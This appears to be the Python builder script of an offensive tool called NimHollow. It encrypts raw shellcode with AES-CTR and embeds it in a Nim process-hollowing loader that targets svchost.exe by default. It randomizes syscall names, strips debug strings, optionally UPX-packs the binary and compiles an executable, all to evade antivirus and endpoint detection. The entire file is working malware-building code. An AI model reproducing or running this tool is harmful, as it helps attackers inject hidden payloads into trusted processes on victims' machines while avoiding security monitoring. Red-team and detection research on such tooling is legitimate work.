#!/usr/bin/env python3

import os
import re
import hashlib
from pathlib import Path
from base64 import b64encode
from random import choices
from string import ascii_lowercase, ascii_uppercase, digits
from argparse import ArgumentParser

import Crypto.Util.Counter
from Crypto.Cipher import AES


class AESCTR:

	def __init__(self, password, iv):
		self.bs = AES.block_size
		self.key = hashlib.sha256(password.encode()).digest()
		self.iv = iv

	def encrypt(self, raw):
		ctr = Crypto.Util.Counter.new(128, initial_value=int.from_bytes(self.iv, byteorder='big'), little_endian=False)
		cipher = AES.new(self.key, AES.MODE_CTR, counter=ctr)
		return cipher.encrypt(raw)


def get_random_string(n):
	return ''.join(choices(ascii_lowercase + ascii_uppercase + digits, k=n))


def parse_args():
	parser = ArgumentParser()
	parser.add_argument('shellcode_bin', action='store', type=str, help='path to the raw shellcode file')
	parser.add_argument('-i', '--image', action='store', type=str, default='C:\\Windows\\System32\\svchost.exe',
                                         help='process image to hollow (default "C:\\Windows\\System32\\svchost.exe")')
	parser.add_argument('-o', '--output', action='store', type=str, help='output filename')
	parser.add_argument('--whispers2', action='store_true', default=False, help='use NimlineWhispers2 to generate syscalls.nim')
	parser.add_argument('--debug', action='store_true', default=False, help='do not strip debug messages from Nim binary')
	parser.add_argument('--upx', action='store_true', default=False, help='compress Nim binary with upx')
	parser.add_argument('--rm', action='store_true', default=False, help='remove Nim files after compiling the binary')
	return parser.parse_args()


if __name__ == '__main__':
	args = parse_args()

	# Generate syscalls.nim header file with NimlineWhispers or NimlineWhispers2
	if args.whispers2:
		os.system('bash NimHollow2.sh')
	else:
		os.system('bash NimHollow.sh')

	with open(Path.cwd() / 'NimHollow.nim', 'r') as fd:
		template = fd.read()

	if not args.debug:
		# Strip debug messages from Nim binary
		template = re.sub(r'.*DEBUG.*\n', '', template)
		template = re.sub(r'\s+# .*', '', template)

	# Choose process image
	template = template.replace('processImage: string = r""', f'processImage: string = r"{args.image}"')

	# Replace syscall names with randomly generated by NimlineWhispers names
	with open('syscalls.nim', 'r') as fd:
		for line in fd.read().splitlines():
			if line.startswith('# '):
				api, api_rnd = line.lstrip('# ').split(' -> ')
				template = template.replace(f'{api}(', f'{api_rnd}( # {api}')

	# Encrypt the shellcode

	with open(args.shellcode_bin, 'rb') as fd:
		shellcode = fd.read()

	password = get_random_string(16)
	iv = os.urandom(16)
	ctx = AESCTR(password, iv)
	enc = ctx.encrypt(shellcode)

	template = template.replace('password: string = ""', f'password: string = "{password}"')
	template = template.replace('ivB64: string = ""', f'ivB64: string = "{b64encode(iv).decode()}"')
	template = template.replace('encB64: string = ""', f'encB64: string = "{b64encode(enc).decode()}"')

	# Output

	out = args.output if args.output else 'out'

	with open(f'{out}.nim', 'w') as fd:
		fd.write(template)

	os.system(f'nim c {out}.nim')

	if args.upx:
		os.system(f'upx --best {out}.exe > /dev/null')

	if args.rm:
		os.remove('syscalls.nim')
		os.remove(f'{out}.nim')

	os.system(f'file {out}.exe')
